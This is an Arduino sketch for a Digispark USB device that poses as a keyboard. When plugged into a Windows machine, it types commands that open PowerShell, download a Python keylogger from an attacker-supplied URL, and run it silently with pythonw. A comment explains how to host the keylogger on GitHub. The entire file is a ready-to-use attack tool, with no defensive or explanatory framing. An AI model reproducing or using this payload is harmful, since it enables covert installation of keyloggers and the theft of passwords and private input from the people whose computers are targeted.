#include "DigiKeyboard.h"

void setup() {

    DigiKeyboard.delay(2000);
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    delay(500);
    DigiKeyboard.print("powershell");
    delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    delay(500);
    DigiKeyboard.print("Invoke-WebRequest -Uri \"Your-Script-URL\" | select -ExpandProperty Content | Out-File -append -encoding utf8 keylogger.pyw"); 
    //Upload the python in github and a copy url from raw
    delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    delay(1000);
    DigiKeyboard.print("pythonw keylogger.pyw");
    delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
;}

void loop() {
    
}
